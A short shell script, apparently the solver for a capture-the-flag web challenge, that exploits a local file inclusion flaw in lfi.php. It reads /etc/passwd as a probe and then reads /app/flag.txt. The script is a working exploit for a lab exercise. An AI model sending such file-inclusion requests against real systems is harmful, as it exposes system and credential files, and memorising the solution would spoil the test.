#!/bin/sh
# Prints the flag to stdout.
# The verifier sets CHALLENGE_HOST, CHALLENGE_PORT, and CHALLENGE_CONNECTION.
set -eu

if [ -n "${CHALLENGE_CONNECTION:-}" ]; then
  base="${CHALLENGE_CONNECTION}"
elif [ -n "${CHALLENGE_HOST:-}" ]; then
  base="http://${CHALLENGE_HOST}:${CHALLENGE_PORT:?}"
else
  base="http://127.0.0.1:${CHALLENGE_PORT:-80}"
fi
base="${base%/}"

# lfi.php `include`s the path in the file parameter.
probe=$(curl -fsS --get --data-urlencode 'file=/etc/passwd' "$base/lfi.php")
printf '%s\n' "$probe" | grep -q 'root:'

# The flag is a readable text file; include prints its contents verbatim.
curl -fsS --get --data-urlencode 'file=/app/flag.txt' "$base/lfi.php" | tr -d '\r'
